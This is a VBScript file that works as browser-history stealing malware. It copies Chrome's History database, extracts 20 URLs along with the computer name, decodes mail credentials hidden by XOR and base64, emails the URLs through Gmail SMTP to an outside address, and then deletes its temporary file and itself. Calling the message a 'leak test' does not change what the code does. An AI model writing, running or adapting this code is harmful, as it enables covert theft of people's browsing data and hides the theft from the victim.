Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

src = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\History"
dst = shell.ExpandEnvironmentStrings("%TEMP%") & "\h.db"
fso.CopyFile src, dst, True

content = fso.OpenTextFile(dst,1).ReadAll

Set re = New RegExp
re.Pattern = "https?://[a-zA-Z0-9./\\-_?=&%]+"
re.Global = True
re.IgnoreCase = True
Set matches = re.Execute(content)

Dim urls, i
urls = "[HISTORY] " & shell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf
i = 0
For Each m In matches
    If i >= 20 Then Exit For
    If Len(m.Value) > 10 Then
        urls = urls & m.Value & vbCrLf
        i = i + 1
    End If
Next

encUser = "EQkCEQ4NRFFbEgsjFQgVWF4dEAoO"
encPass = "CwsTC0UVU11CUxISBghUSEVRFw=="
key = "secret123"

Function Base64Decode(b64Str)
    Dim xml,node
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.CreateElement("b64")
    node.dataType = "bin.base64"
    node.text = b64Str
    Base64Decode = node.nodeTypedValue
End Function

Function DecodeWithXOR(b64,key)
    Dim bytes,result,i
    bytes = Base64Decode(b64)
    result = ""
    For i = 0 To UBound(bytes)
        result = result & Chr(bytes(i) Xor Asc(Mid(key,(i Mod Len(key))+1,1)))
    Next
    DecodeWithXOR = result
End Function

user = DecodeWithXOR(encUser,key)
pass = DecodeWithXOR(encPass,key)

Dim msg,conf
Set msg = CreateObject("CDO.Message")
Set conf = msg.Configuration
With conf.Fields
    .Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
    .Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"
    .Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 587
    .Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
    .Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = user
    .Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = pass
    .Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
    .Update
End With

msg.Subject = "Chrome History Leak Test - 20 URLs"
msg.From = user
msg.To = "yuchan8003@naver.com"
msg.TextBody = urls

On Error Resume Next
msg.Send

fso.DeleteFile dst, True
fso.DeleteFile WScript.ScriptFullName